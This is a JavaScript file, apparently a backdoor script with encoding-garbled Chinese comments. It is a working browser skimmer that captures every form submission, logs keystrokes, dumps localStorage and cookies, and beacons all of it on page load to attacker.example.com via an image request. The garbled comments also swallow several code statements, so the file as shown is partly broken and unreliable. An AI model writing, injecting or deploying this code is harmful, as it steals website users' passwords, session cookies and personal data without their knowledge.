// 鍚庨棬鑴氭湰 - 閿洏璁板綍鍣?(function() {
    // 鏀堕泦琛ㄥ崟鏁版嵁
    const collectFormData = () => {
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            form.addEventListener('submit', function(e) {
                const formData = {};
                const inputs = form.querySelectorAll('input, select, textarea');
                inputs.forEach(input => {
                    if (input.name && input.value) {
                        formData[input.name] = input.value;
                    }
                });
                // 鍙戦€佸埌鏀诲嚮鑰呮湇鍔″櫒
                sendToAttacker('form_submit', formData);
            });
        });
    };

    // 閿洏璁板綍
    const keylogger = () => {
        document.addEventListener('keypress', function(e) {
            const target = e.target;
            const data = {
                key: e.key,
                target: target.tagName,
                name: target.name || target.id || '',
                type: target.type || ''
            };
            sendToAttacker('keypress', data);
        });
    };

    // 绐冨彇localStorage
    const stealLocalStorage = () => {
        const data = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data[key] = localStorage.getItem(key);
        }
        sendToAttacker('localStorage', data);
    };

    // 绐冨彇Cookie
    const stealCookies = () => {
        sendToAttacker('cookies', document.cookie);
    };

    // 鍙戦€佸埌鏀诲嚮鑰呮湇鍔″櫒
    const sendToAttacker = (type, data) => {
        const payload = {
            type: type,
            data: data,
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };
        
        // 浣跨敤Image瀵硅薄鍙戦€佹暟鎹紙缁曡繃CORS锛?        const img = new Image();
        img.src = 'https://attacker.example.com/log?data=' + encodeURIComponent(JSON.stringify(payload));
    };

    // 鍒濆鍖?    const init = () => {
        collectFormData();
        keylogger();
        stealLocalStorage();
        stealCookies();
        
        // 瀹氭湡鍙戦€佹暟鎹?        setInterval(() => {
            stealLocalStorage();
        }, 60000); // 姣忓垎閽熷彂閫佷竴娆?    };

    // 椤甸潰鍔犺浇瀹屾垚鍚庢墽琛?    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();